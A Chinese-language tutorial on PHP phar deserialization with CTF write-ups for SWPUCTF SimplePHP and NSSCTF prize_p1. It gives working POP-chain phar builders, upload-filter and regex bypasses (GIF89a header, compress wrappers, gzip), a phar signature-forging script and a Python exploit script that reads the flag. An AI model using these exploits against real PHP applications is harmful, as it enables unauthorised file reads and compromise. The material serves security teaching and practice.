##  Phar反序列化

phar文件本质上是一种压缩文件，会以**序列化**的形式存储用户自定义的meta-data。**当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容**。(漏洞利用点)



### 什么是phar文件

在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发

php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器

### 常见的流包装器

```
file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

### phar文件必要的结构组成

>stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?> 结尾，否则无法识别。xxx可以为自定义内容。
>
>manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。
>
>content:被压缩文件的内容
>
>signature (可空):签名，放在末尾。

### 受影响的文件操作函数

![img](https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2151deae-b344-1.png)

### 漏洞利用条件

>1. phar可以上传到服务器端(存在文件上传)
>
>2. 要有可用的魔术方法作为“跳板”。
>3. 文件操作函数的参数可控，且`:`、`/`、`phar`等特殊字符没有被过滤

###  phar文件的生成

```php
<?php
    class TestObject {
    }
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $o -> data='hu3sky';
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```



### 绕过方式

当环境限制了phar不能出现在前面的字符里。可以使用`compress.bzip2://`和`compress.zlib://`等绕过

```
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
```

也可以利用其它协议

```
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

GIF格式验证可以通过在文件头部添加GIF89a绕过

```
1、$phar->setStub(“GIF89a”."<?php __HALT_COMPILER(); ?>"); //设置stub
2、生成一个phar.phar，修改后缀名为phar.gif
```

##  例题

###  SWPUCTF 2018]SimplePHP

打开网页，发现有上传文件的地方和查看文件的地方。

验证，查看文件的URL

```
http://52194e11-15f5-46ef-9ddf-625a7d9d5415.node4.buuoj.cn:81/file.php?file=
```

file参数可以查看代码

index.php

```php
<?php
header("content-type:text/html;charset=utf-8");
include 'base.php';
?>
```

base.php

```php
<?php
    session_start();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>web3</title>
    <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
    <nav class="navbar navbar-default" role="navigation">
        <div class="container-fluid">
        <div class="navbar-header">
            <a class="navbar-brand" href="index.php">首页</a>
        </div>
            <ul class="nav navbar-nav navbra-toggle">
                <li class="active"><a href="file.php?file=">查看文件</a></li>
                <li><a href="upload_file.php">上传文件</a></li>
            </ul>
            <ul class="nav navbar-nav navbar-right">
                <li><a href="index.php"><span class="glyphicon glyphicon-user"></span><?php echo $_SERVER['REMOTE_ADDR'];?></a></li>
            </ul>
        </div>
    </nav>
</body>
</html>
<!--flag is in f1ag.php-->


```

在bese.php中看到`flag is in f1ag.php`，直接用file=flag is in f1ag.php,但是过滤了，不行。



upload_file.php

```php
<?php

include 'function.php';
upload_file();
?>
<html>
<head>
    <meta charest="utf-8">
    <title>文件上传</title>
</head>
<body>
<div align="center">
    <h1>前端写得很low,请各位师傅见谅!</h1>
</div>
<style>
    p {
        margin: 0 auto
    }
</style>
<div>
    <form action="upload_file.php" method="post" enctype="multipart/form-data">
        <label for="file">文件名:</label>
        <input type="file" name="file" id="file"><br>
        <input type="submit" name="submit" value="提交">
</div>

</script>
</body>
</html>

```

function.php

```php
<?php

//show_source(__FILE__);
include "base.php";
header("Content-type: text/html;charset=utf-8");
error_reporting(0);
function upload_file_do()
{
    global $_FILES;
    $filename = md5($_FILES["file"]["name"] . $_SERVER["REMOTE_ADDR"]) . ".jpg";
    //mkdir("upload",0777);
    if (file_exists("upload/" . $filename)) {
        unlink($filename);
    }
    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename);
    echo '<script type="text/javascript">alert("上传成功!");</script>';
}

function upload_file()
{
    global $_FILES;
    if (upload_file_check()) {
        upload_file_do();
    }
}

function upload_file_check()
{
    global $_FILES;
    $allowed_types = array("gif", "jpeg", "jpg", "png");
    $temp = explode(".", $_FILES["file"]["name"]);
    $extension = end($temp);
    if (empty($extension)) {
        //echo "<h4>请选择上传的文件:" . "<h4/>";
    } else {
        if (in_array($extension, $allowed_types)) {
            return true;
        } else {
            echo '<script type="text/javascript">alert("Invalid file!");</script>';
            return false;
        }
    }
}

```

上传的文件需要经过function.php的过滤，只允许四种图片的后缀才能上传。

file.php

```php
<?php

header("content-type:text/html;charset=utf-8");
include 'function.php';
include 'class.php';
ini_set('open_basedir', '/var/www/html/');
$file = $_GET["file"] ? $_GET['file'] : "";
if (empty($file)) {
    echo "<h2>There is no file to show!<h2/>";
}
$show = new Show();
if (file_exists($file)) {
    $show->source = $file;
    $show->_show();
} else if (!empty($file)) {
    die('file doesn\'t exists.');
}


```

file.php中include了class.php，通过class.php的`_show()`方法，将文件的内容显示出来。

class.php

```php
<?php

class C1e4r
{
    public $test;
    public $str;

    public function __construct($name)
    {
        $this->str = $name;
    }

    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;

    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }

    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }

    public function __set($key, $value)
    {
        $this->$key = $value;
    }

    public function _show()
    {
        if (preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i', $this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }

    }

    public function __wakeup()
    {
        if (preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $file;
    public $params;

    public function __construct()
    {
        $this->params = array();
    }

    public function __get($key)
    {
        return $this->get($key);
    }

    public function get($key)
    {
        if (isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }

    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}

```

在class.php中

```php
 public function _show()
    {
        if (preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i', $this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }

    }
```

对传入的file参数进行了过滤。本来想直接通过绕过preg_match来读取f1ag.php文件。

但是本题的考点是`phar反序列化`

继续看，在class.php的Test类中

```php
public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
```

我们可以利用file_get_contents

思路：我们首先生成一个phar文件，其中meta值里面是对class.php的序列化值，然后上传，获取文件的路径和文件名。然后，通过file参数访问该文件，file参数会经过`file_exists()`，直接触发phar进行反序列化，触发漏洞。



构造class.php的pop链。

我们可以得到利用链：C1e4r::__destruct()的

```php
echo $this->test;
```

中的$this->test被当作字符串，此时当$this->test=Show类时，调用Show::__toString()函数。设置

```php
$this->str['str']=Test类
```

因此

```
$this->str['str']->source=Test类->source
```


此时Test类调用不存在的属性source，此时就会调用Test::__get函数并执行

```
$this->get(source)
```


接着到Test::get函数里面执行

```
$value = $this->params["source"];
```

设置

```
$this->params["source"]="/var/www/html/f1ag.php"
```


然后执行

```
$this->file_get("/var/www/html/f1ag.php")
```


最后返回

```
base64_encode(file_get_contents("/var/www/html/f1ag.php"));
```

解码就可以得到flag了。

pop链

```
<?php
class C1e4r
{
    public $test;
    public $str;
}
class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;
}

$c1e4r = new C1e4r();
$show = new Show();
$test = new Test();
$test->params['source'] = "/var/www/html/f1ag.php";
$c1e4r->str = $show;   //利用  $this->test = $this->str; echo $this->test;
$show->str['str'] = $test;  //利用 $this->str['str']->source;

$phar = new Phar("exp.phar"); //.phar文件
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>'); //固定的
$phar->setMetadata($c1e4r); //触发的头是C1e4r类，所以传入C1e4r对象，将自定义的meta-data存入manifest
$phar->addFromString("exp.txt", "test"); //随便写点什么生成个签名，添加要压缩的文件
$phar->stopBuffering();
?>
```

得到phar文件，修改后缀为jpg，上传。

得到文件名的两种方法

方法1：

```php
function upload_file_do()
{
    global $_FILES;
    $filename = md5($_FILES["file"]["name"] . $_SERVER["REMOTE_ADDR"]) . ".jpg";
    //mkdir("upload",0777);
    if (file_exists("upload/" . $filename)) {
        unlink($filename);
    }
    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename);
    echo '<script type="text/javascript">alert("上传成功!");</script>';
}
```

文件名是`$filename = md5($_FILES["file"]["name"] . $_SERVER["REMOTE_ADDR"]) . ".jpg";`

路径是url+/upload/文件名

(但是这种方法感觉不对,得不出flag,个人做的时候出现问题了)

方法2:

直接访问,URL+/upload/可以查看文件名



最后直接

```
file=phar://upload/文件名,就可以得到flag
```

### [NSSCTF]prize_p1

考点:

>1. phar反序列化
>2. 绕过Error异常
>3. phar签名修改
>4. GC进制(垃圾回收系统)

wp:

打开,直接审计代码

```php
<META http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
highlight_file(__FILE__);
class getflag {
    function __destruct() {
        echo getenv("FLAG");
    }
}

class A {
    public $config;
    function __destruct() {
        if ($this->config == 'w') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            file_put_contents("./tmp/a.txt", $data);
        } else if ($this->config == 'r') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            echo file_get_contents($data);
        }
    }
}
if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $_GET[0])) {
    die("我知道你想干吗，我的建议是不要那样做。");
}
unserialize($_GET[0]);
throw new Error("那么就从这里开始起航吧");

```

分析代码，其中`getflag`的`__destruct`方法触发即可得到flag，`A`的`__destruct`方法触发即可写`/tmp/a.txt`或者任意文件读。

####  PHP对象

`__destruct`是PHP对象的一个魔术方法，称为析构函数，顾名思义这是当该对象被销毁的时候自动执行的一个函数。其中以下情况会触发`__destruct`

1. 主动调用`unset($obj)`
2. 主动调用`$obj = NULL`
3. 程序自动结束

除此之外，PHP还拥有垃圾回收`Garbage collection`即我们常说的`GC`机制。

PHP中`GC`使用引用计数和回收周期自动管理内存对象，那么这时候当我们的对象变成了“垃圾”，就会被`GC`机制自动回收掉，回收过程中，就会调用函数的`__destruct`。

刚才我们提到了引用计数，其实当一个对象没有任何引用的时候，则会被视为“垃圾”，即

```
$a = new show();
```

这是一个`show`对象，被`a`变量应用，所以它不是“垃圾”。如果是

```
new show();
```

或

```
$a = new show();$a = 2;
```

上面都是对象没有被饮用或开始有引用之后失去了引用的情况，我们可以考虑下列实例代码。

```
<?php
class show{
function __construct($i) {$this->i = $i; }
function __destruct() { echo $this->i."Destroy...\n"; }
}
new show('1');
$a = new show('2');
$a = new show('3');
echo "————————————\n";
```

输出:

```
1Destroy...
2Destroy...
————————————
3Destroy...
```

这儿是当`a`第二次赋值时,`show('2')`执行`__destruct`,然后执行`echo`,当程序完了后执行`show('3')`的`__destruct`

####  绕过异常

看到有个`unserialize`函数可以进行反序列化，同时会发现这里反序列化是没有任何引用的，所以按照上述会在执行完毕之后处于`unset`状态，会回收这个对象，即执行`__destruct`这样的话，这样就绕过`error`,就可以进入A类中写入数据。

```
O:1:"A":1:{s:6:"config";s:1:"w";}
```

####  phar://反序列化

正则表达式过滤了伪协议，若直接phar反序列化，那么反序列化对象中依旧会有明文。

```
https://guokeya.github.io/post/uxwHLckwx
```

有五种能触发phar的操作，我们通过将phar文件压缩为另一种文件格式，这样反序列化依旧能够触发并且数据中不会出现明文从而绕过正则表达式

>普通phar
>gzip
>bzip2
>tar
>zip

####  处理getflag()类

如果我们直接在phar文件的Metadata写`getflag`对象的话，是不能进行反序列化的，因为它反序列化之后会被phar对象的metadata属性引用，不符合unset情况，也就不会直接执行`__destruct`

我们利用GC机制去执行`__destruct`

```
a:2:{i:0;O:7:"getflag":{}i:0;N;}
```

 考虑反序列化本字符串，因为**反序列化的过程是顺序执行**的，所以到第一个属性时，会将`Array[0]`设置为`getflag`对象，同时我们又将`Array[0]`设置为`null`，这样前面的`getflag`对象便丢失了引用，就会被GC所捕获，就可以执行`__destruct`了。

####  签名修改

我们需要写入

```
a:2:{i:0;O:7:"getflag":{}i:0;N;}
```

但是,因为直接得到的序列化字符串是

```
a:2:{i:0;O:7:"getflag":{}i:1;N;}
```

所以我们需要将i:1,变为i:0.但是如果直接修改的话会因为签名错误而报错，那么我们可以修改签名.

通过PHP文档我们找到了Phar签名数据在文件的最后

| 长度  | 内容                            |
| ----- | ------------------------------- |
| 变长  | 签名字节                        |
| 4字节 | 签名类型，1代表md5，2代表sha1等 |
| 4字节 | GBMB标识                        |

通过010-editor,查看phar文件签名类型

先生成phar文件

```php
<?php
class getflag{

}

$c=new getflag();
$phar = new Phar("phar1.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata([0=>$c,1=>NULL]); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>

```

sha1签名为例

```php
from hashlib import sha1
f = open('./phar1.phar', 'rb').read() # 修改内容后的phar文件
s = f[:-28] # 获取要签名的数据
h = f[-8:] # 获取签名类型以及GBMB标识
newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB
open('phar2.phar', 'wb').write(newf) # 写入新文件
```

得到修改签名后的文件

跑脚本,传数据

```python
import requests
import gzip
import re

url = 'http://xxx.nss.ctfer.vip:9080/'

file = open("./phar2.phar", "rb") #打开文件
file_out = gzip.open("./phar.zip", "wb+")#创建压缩文件对象
file_out.writelines(file)
file_out.close()
file.close()
# 先将phar的内容写入/tmp/a.txt,其中file_put_contents相当于文件上传.
requests.post(
    url,
    params={
        0: 'O:1:"A":{s:6:"config";s:1:"w";}'
    },
    data={
        0: open('./phar.zip', 'rb').read()
    }
) # 写入
# file_get_contents时,就会触发phar反序列化,得到flag
res = requests.post(
    url,
    params={
        0: 'O:1:"A":1:{s:6:"config";s:1:"r";}'
    },
    data={
        0: 'phar://tmp/a.txt'
    }
) # 触发

flag = re.compile('(NSSCTF\{.+?\})').findall(res.text)[0]
print(flag)
```

参考:https://www.ctfer.vip/#/note/set/wp/33

##  参考文献

https://y4tacker.blog.csdn.net/article/details/113588692?spm=1001.2014.3001.5502

https://xz.aliyun.com/t/2715#toc-1

https://xz.aliyun.com/t/2613